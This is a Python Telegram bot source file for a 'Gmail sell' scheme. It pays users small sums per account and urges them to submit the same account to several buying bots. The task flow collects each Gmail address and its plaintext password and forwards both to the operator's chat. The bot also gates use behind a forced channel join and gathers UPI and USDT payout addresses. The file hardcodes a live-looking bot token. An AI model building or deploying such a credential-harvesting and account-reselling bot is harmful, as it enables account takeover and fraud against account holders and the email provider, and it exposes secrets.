import sqlite3
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters,
    ContextTypes,
)

# ---------------- CONFIGURATION ----------------
BOT_TOKEN = "8521476558:AAHsISThvrA_w1tGBzOkSsHFlJxJKByh7Us"  # Your token
ADMIN_ID = 6112720850                                      # Your Telegram ID
CHANNEL_USERNAME = "@googlejobhubsudeb"                  # CHANGE THIS to your channel username (e.g. @mychannel)

# Conversation States
EMAIL_STATE, PASSWORD_STATE = range(2)
UPI_STATE, USDT_STATE = range(2, 4)
APPROVE_AMOUNT_STATE = 4

# Custom Start Message
WELCOME_TEXT = (
    "EARN UP TO ₹45/0.45$ FOR EACH ACCOUNT YOU CREATE 💪\n"
    "-----------------------------------\n"
    "YOU CAN EARN TWO TIMES FOR EACH GMAIL ACCOUNT YOU CREATE!✅🤑\n"
    "STEP 1) CREATE ACCOUNT IN ANY OF THE BOTS BELLOW📉\n\n"
    "@GmailFarmerBot\n"
    "@gmailpaybot\n\n"
    "STEP 2) WAIT UNTIL THEY PAY YOU  AFTER PAY SUBMIT THE SAME GMAIL IN THE BOT  @SUDEBGMAILSELL_BOT💪💪\n\n"
    "EARN TWO TIMES FOR THE SAME ACCOUNT!✅🤑\n"
    "FOR QUIRES PM @SUDEBNOMERCY"
)

# ---------------- DATABASE SETUP ----------------
def init_db():
    conn = sqlite3.connect("user_data.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            balance REAL DEFAULT 0.0
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS accounts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            email TEXT,
            status TEXT DEFAULT 'PENDING'
        )
    """)
    conn.commit()
    conn.close()

init_db()

def get_user(user_id, username):
    conn = sqlite3.connect("user_data.db")
    cursor = conn.cursor()
    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    if not row:
        cursor.execute("INSERT INTO users (user_id, username, balance) VALUES (?, ?, 0.0)", (user_id, username))
        conn.commit()
        balance = 0.0
    else:
        balance = row[0]
    conn.close()
    return balance

def update_balance(user_id, amount):
    conn = sqlite3.connect("user_data.db")
    cursor = conn.cursor()
    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    if row:
        new_bal = row[0] + amount
        cursor.execute("UPDATE users SET balance = ? WHERE user_id = ?", (new_bal, user_id))
        conn.commit()
        conn.close()
        return new_bal
    conn.close()
    return None

def add_account_submission(user_id, email):
    conn = sqlite3.connect("user_data.db")
    cursor = conn.cursor()
    cursor.execute("INSERT INTO accounts (user_id, email, status) VALUES (?, ?, 'PENDING')", (user_id, email))
    conn.commit()
    account_id = cursor.lastrowid
    conn.close()
    return account_id

def update_account_status(account_id, status):
    conn = sqlite3.connect("user_data.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE accounts SET status = ? WHERE id = ?", (status, account_id))
    conn.commit()
    conn.close()

def get_user_account_counts(user_id):
    conn = sqlite3.connect("user_data.db")
    cursor = conn.cursor()
    cursor.execute("SELECT status, COUNT(*) FROM accounts WHERE user_id = ? GROUP BY status", (user_id,))
    rows = cursor.fetchall()
    conn.close()
    
    counts = {"PENDING": 0, "ACCEPTED": 0, "REJECTED": 0}
    for status, count in rows:
        if status in counts:
            counts[status] = count
    return counts

def get_all_users():
    conn = sqlite3.connect("user_data.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    rows = cursor.fetchall()
    conn.close()
    return [row[0] for row in rows]

# ---------------- KEYBOARDS & VERIFICATION ----------------
def join_channel_keyboard():
    channel_url = f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}"
    keyboard = [
        [InlineKeyboardButton("📢 Join Channel", url=channel_url)],
        [InlineKeyboardButton("✅ Done", callback_data="check_join")]
    ]
    return InlineKeyboardMarkup(keyboard)

def main_menu():
    keyboard = [
        [InlineKeyboardButton("📋 Task", callback_data="btn_task"), InlineKeyboardButton("💰 Balance", callback_data="btn_balance")],
        [InlineKeyboardButton("📂 My Accounts", callback_data="btn_my_accounts")],
        [InlineKeyboardButton("💬 Support", callback_data="btn_support"), InlineKeyboardButton("💳 Withdrawal", callback_data="btn_withdrawal")]
    ]
    return InlineKeyboardMarkup(keyboard)

def withdrawal_menu():
    keyboard = [
        [InlineKeyboardButton("1️⃣ UPI", callback_data="withdraw_upi")],
        [InlineKeyboardButton("2️⃣ USDT (BEP20)", callback_data="withdraw_usdt")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_home")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def is_user_subscribed(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception:
        # If bot is not admin in channel or error occurs
        return False

# ---------------- HANDLERS ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_user(user.id, user.username)

    # Check Channel Join Status
    subscribed = await is_user_subscribed(user.id, context)

    if not subscribed:
        msg = "⚠️ **Access Denied!**\n\nYou must join our official channel before using this bot service!"
        if update.message:
            await update.message.reply_text(msg, reply_markup=join_channel_keyboard(), parse_mode="Markdown")
        else:
            await update.callback_query.edit_message_text(msg, reply_markup=join_channel_keyboard(), parse_mode="Markdown")
        return

    # User joined -> show start text
    if update.message:
        await update.message.reply_text(WELCOME_TEXT, reply_markup=main_menu())
    else:
        await update.callback_query.edit_message_text(WELCOME_TEXT, reply_markup=main_menu())

async def check_join_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user

    subscribed = await is_user_subscribed(user.id, context)

    if subscribed:
        await query.answer("✅ Verification successful!")
        await query.edit_message_text(WELCOME_TEXT, reply_markup=main_menu())
    else:
        await query.answer("❌ You have not joined the channel yet! Please join first.", show_alert=True)

# --- TASK CONVERSATION ---
async def task_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user

    if not await is_user_subscribed(user.id, context):
        await query.answer("❌ You must join our channel to use tasks!", show_alert=True)
        await query.edit_message_text("⚠️ Please join our channel to continue:", reply_markup=join_channel_keyboard())
        return ConversationHandler.END

    await query.answer()
    task_prompt = (
        "SUBMIT YOUR GMAIL\n"
        "PER GMAIL SELL TASK ₹15/0.15$\n\n"
        "📧 Please enter your Gmail address:"
    )
    await query.edit_message_text(task_prompt)
    return EMAIL_STATE

async def task_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['task_email'] = update.message.text
    await update.message.reply_text("🔑 Submit your password:")
    return PASSWORD_STATE

async def task_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text
    email = context.user_data.get('task_email')
    user = update.effective_user

    acc_id = add_account_submission(user.id, email)

    confirmation_msg = (
        "YOUR GMAIL WILL BE VERIFY 1-2HOUR MAXIMUM 24H BE PATIENT OUR TEAM VERIFY AS SOON AS POSSIBLE"
    )
    await update.message.reply_text(confirmation_msg, reply_markup=main_menu())

    admin_keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Approve", callback_data=f"adm_app_{user.id}_{acc_id}"),
            InlineKeyboardButton("❌ Reject", callback_data=f"adm_rej_{user.id}_{acc_id}")
        ]
    ])

    admin_msg = (
        f"📥 **NEW TASK SUBMISSION**\n\n"
        f"• **User:** @{user.username} (ID: `{user.id}`)\n"
        f"• **Email:** `{email}`\n"
        f"• **Password:** `{password}`\n"
        f"• **Acc Ref ID:** `{acc_id}`"
    )
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, reply_markup=admin_keyboard, parse_mode="Markdown")
    return ConversationHandler.END

# --- WITHDRAWAL FLOW ---
async def withdrawal_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    balance = get_user(user.id, user.username)

    if balance < 30:
        await query.edit_message_text(
            f"❌ **Withdrawal Failed**\n\nYour current balance is **{balance} RS**.\nMinimum balance required to withdraw is **30 RS**.",
            reply_markup=main_menu(),
            parse_mode="Markdown"
        )
        return ConversationHandler.END

    await query.edit_message_text("Choose your withdrawal method:", reply_markup=withdrawal_menu())
    return ConversationHandler.END

async def upi_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("📱 Submit your UPI address:")
    return UPI_STATE

async def upi_submit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    upi_id = update.message.text
    user = update.effective_user
    balance = get_user(user.id, user.username)

    await update.message.reply_text(
        f"✅ Withdrawal request submitted for **{balance} RS**!\nYour request is being processed.",
        reply_markup=main_menu(),
        parse_mode="Markdown"
    )

    admin_msg = (
        f"💸 **NEW WITHDRAWAL REQUEST (UPI)**\n\n"
        f"• **User:** @{user.username} (ID: `{user.id}`)\n"
        f"• **Amount:** {balance} RS\n"
        f"• **UPI Address:** `{upi_id}`"
    )
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown")
    return ConversationHandler.END

async def usdt_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("🌐 Submit your USDT BEP20 address:")
    return USDT_STATE

async def usdt_submit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    usdt_id = update.message.text
    user = update.effective_user
    balance = get_user(user.id, user.username)

    await update.message.reply_text(
        f"✅ Withdrawal request submitted for **{balance} RS**!\nYour request is being processed.",
        reply_markup=main_menu(),
        parse_mode="Markdown"
    )

    admin_msg = (
        f"💸 **NEW WITHDRAWAL REQUEST (USDT BEP20)**\n\n"
        f"• **User:** @{user.username} (ID: `{user.id}`)\n"
        f"• **Amount:** {balance} RS\n"
        f"• **USDT Address:** `{usdt_id}`"
    )
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown")
    return ConversationHandler.END

# --- OTHER BUTTONS ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user
    data = query.data

    if data == "check_join":
        await check_join_click(update, context)
        return

    if not await is_user_subscribed(user.id, context):
        await query.answer("❌ You must join our channel to use the bot!", show_alert=True)
        await query.edit_message_text("⚠️ Please join our channel to continue:", reply_markup=join_channel_keyboard())
        return

    await query.answer()

    if data == "btn_balance":
        bal = get_user(user.id, user.username)
        await query.edit_message_text(
            f"💰 **Your Current Balance:** {bal} RS",
            reply_markup=main_menu(),
            parse_mode="Markdown"
        )

    elif data == "btn_my_accounts":
        counts = get_user_account_counts(user.id)
        msg = (
            f"📂 **MY ACCOUNTS STATS**\n\n"
            f"⏳ **PENDING:** {counts['PENDING']}\n"
            f"✅ **ACCEPTED:** {counts['ACCEPTED']}\n"
            f"❌ **REJECTED:** {counts['REJECTED']}"
        )
        await query.edit_message_text(msg, reply_markup=main_menu(), parse_mode="Markdown")

    elif data == "btn_support":
        await query.edit_message_text(
            "💬 For any queries contact @SUDEBNOMERCY",
            reply_markup=main_menu()
        )
    elif data == "back_home":
        await start(update, context)

    # --- ADMIN APPROVAL ACTIONS ---
    elif data.startswith("adm_app_"):
        parts = data.split("_")
        target_id = int(parts[2])
        acc_id = int(parts[3]) if len(parts) > 3 else None
        
        context.user_data['approve_target_id'] = target_id
        context.user_data['approve_acc_id'] = acc_id
        
        await query.message.reply_text(f"💵 How much RS do you want to award to user `{target_id}`? Send the number:")
        return APPROVE_AMOUNT_STATE

    elif data.startswith("adm_rej_"):
        parts = data.split("_")
        target_id = int(parts[2])
        acc_id = int(parts[3]) if len(parts) > 3 else None
        
        if acc_id:
            update_account_status(acc_id, "REJECTED")
            
        await query.edit_message_text(f"❌ Task Rejected for User `{target_id}`.")
        await context.bot.send_message(chat_id=target_id, text="❌ **Task Update:** Your submitted Gmail was rejected or invalid.")

async def process_approve_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return ConversationHandler.END
    try:
        amount = float(update.message.text)
        target_id = context.user_data.get('approve_target_id')
        acc_id = context.user_data.get('approve_acc_id')
        
        new_bal = update_balance(target_id, amount)
        if acc_id:
            update_account_status(acc_id, "ACCEPTED")
        
        await update.message.reply_text(f"✅ Approved! Added {amount} RS to User `{target_id}`. New Balance: {new_bal} RS")
        await context.bot.send_message(
            chat_id=target_id,
            text=f"🎉 **Task Approved!**\n\n+{amount} RS credited to your wallet. Total Balance: {new_bal} RS",
            parse_mode="Markdown"
        )
    except Exception:
        await update.message.reply_text("⚠️ Invalid number. Approval cancelled.")
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Action cancelled.", reply_markup=main_menu())
    return ConversationHandler.END

# ---------------- MAIN APP ----------------
if __name__ == '__main__':
    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .read_timeout(30)
        .write_timeout(30)
        .connect_timeout(30)
        .pool_timeout(30)
        .build()
    )

    task_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(task_start, pattern="^btn_task$")],
        states={
            EMAIL_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, task_email)],
            PASSWORD_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, task_password)],
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    withdrawal_conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(upi_click, pattern="^withdraw_upi$"),
            CallbackQueryHandler(usdt_click, pattern="^withdraw_usdt$")
        ],
        states={
            UPI_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, upi_submit)],
            USDT_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, usdt_submit)],
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    approval_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern="^adm_app_")],
        states={
            APPROVE_AMOUNT_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_approve_amount)],
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(task_conv)
    app.add_handler(withdrawal_conv)
    app.add_handler(approval_conv)
    app.add_handler(CallbackQueryHandler(withdrawal_click, pattern="^btn_withdrawal$"))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("Force Join Bot Active!")
    app.run_polling(poll_interval=1.0, timeout=20)

